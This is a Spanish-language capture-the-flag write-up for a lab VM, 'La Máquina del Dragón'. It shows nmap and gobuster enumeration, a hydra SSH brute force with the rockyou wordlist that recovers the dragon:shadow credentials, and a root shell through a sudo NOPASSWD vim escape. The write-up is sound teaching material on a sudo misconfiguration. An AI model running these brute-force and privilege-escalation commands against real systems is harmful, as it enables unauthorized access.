🐉 Writeup: La Máquina del Dragón  

---

## 🔍 **1. Reconocimiento (Recon)**  

### Descubrimiento de hosts en la red local  
```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```  
→ Identificamos activamente los hosts vivos en el segmento `192.168.1.0/24`.  

### Escaneo de puertos abiertos en el objetivo  
```bash
sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.54 -oG allPorts
extractPorts allPorts
```

**Salida de `extractPorts`:**  
```
[*] Extracting information...

        [*] IP Address: 192.168.1.54  
        [*] Open ports: 22,80  

[*] Ports copied to clipboard  
```  
✅ Objetivo identificado: `192.168.1.54` con **puertos 22 (SSH)** y **80 (HTTP)** abiertos.  

> ⚠️ Nota: En el siguiente comando hay un *typo* en la IP (`192.168.80.91`) y en el reporte aparece `192.168.0.0`, pero por coherencia con `extractPorts`, el objetivo real es **`192.168.1.54`** — asumimos que fue un error de tipeo durante la ejecución.

---

## 🛰️ **2. Enumeración de Servicios**  

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 -oN target 192.168.1.54
```  

**Resultados clave:**  
| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| `22/tcp` | open | `ssh` | OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 |
| `80/tcp` | open | `http` | Apache httpd 2.4.58 (Ubuntu) |

🔍 **Hallazgos adicionales:**  
- Título de la web: `_http-title: La Máquina del Dragón`  
- Header del servidor: `_http-server-header: Apache/2.4.58 (Ubuntu)`  
- MAC Address: `08:00:27:97:4C:47` → VirtualBox (entorno controlado).  
- Sistema operativo: **Linux (Ubuntu)**  

---

## 🌐 **3. Enumeración Web**  

Accedemos a `http://192.168.1.54` y realizamos fuzzing de directorios:  
```bash
gobuster dir -u http://192.168.1.54 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```  

✅ Hallazgo crítico:  
➡️ `/secret/`  
Al visitarlo, se muestra un mensaje dirigido al usuario (posiblemente una pista para credenciales o contexto narrativo).  

---
<img width="1178" height="573" alt="image" src="https://github.com/user-attachments/assets/09a759e4-c198-4632-9330-f81594b43303" />

## 🔑 **4. Explotación: Fuerza Bruta SSH**  

Con el usuario sospechado (`dragon`) y usando la wordlist clásica:  
```bash
hydra -l dragon -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.54
```  
<img width="1167" height="637" alt="image" src="https://github.com/user-attachments/assets/8c37e849-a809-4f4b-9ab3-52445f28d968" />



🎯 Credenciales obtenidas:  
- **Usuario:** `dragon`  
- **Contraseña:** `shadow`  

→ Conectamos vía SSH:  
```bash
ssh dragon@192.168.1.54
```  

---

## ⚔️ **5. Escalada de Privilegios**  

Una vez dentro como `dragon`, verificamos permisos sudo:  
```bash
sudo -l
```  

**Salida:**  
```
Matching Defaults entries for dragon on La-Maquina-del-Dragn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dragon may run the following commands on La-Maquina-del-Dragn:
    (ALL) NOPASSWD: /usr/bin/vim
```  

💥 **Vulnerabilidad crítica**: `vim` puede ejecutarse como **cualquier usuario (incluido root)** sin contraseña.  

### ✅ Técnica de escape (GTFOBins):  
```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```  
→ Se lanza una shell interactiva con privilegios **root**.  

💡 *Explicación breve:* El flag `-c` ejecuta el comando `!/bin/sh` desde el modo de comandos de vim, lo cual lanza una shell externa heredando los permisos de `sudo` (es decir, **root**).  

---

## 🏁 **6. Post-explotación & Bandera Root**  

Ya como `root`:  
```bash
cd /root  
ls -la  
cat flag.txt  # o bandera_root.txt / root.txt / etc.
```  

✅ Obtenemos la **bandera root**, confirmando el compromiso total de la máquina.  

---

## 🧾 Resumen de Flujos Clave  

| Etapa | Herramienta | Hallazgo | Impacto |
|--------|-------------|----------|---------|
| Recon | `netdiscover` + `nmap` | Host `192.168.1.54`, puertos `22/80` abiertos | Identificación del objetivo |
| Enum Web | `gobuster` | Directorio `/secret/` | Pista contextual y posible vector de información |
| Acceso | `hydra` | Credenciales `dragon:shadow` | Acceso inicial no autorizado |
| Privesc | `sudo vim` + GTFOBins | Ejecución de `/bin/sh` como root | Escalada completa a `root` |
| Exfil | `cat /root/*` | Bandera root obtenida | Objetivo cumplido ✅ |

---

🛡️ **Lección clave:**  
> *"Un binario confiable como `vim`, cuando se permite su ejecución sin contraseña mediante `sudo`, deja de ser una herramienta de edición… y se convierte en una puerta trasera directa a `root`."*  

¡Y así, el dragón fue domado. 🐉🔥  

---  
*Writeup realizado con fines educativos — siempre obtén autorización antes de escanear o explotar cualquier sistema.*
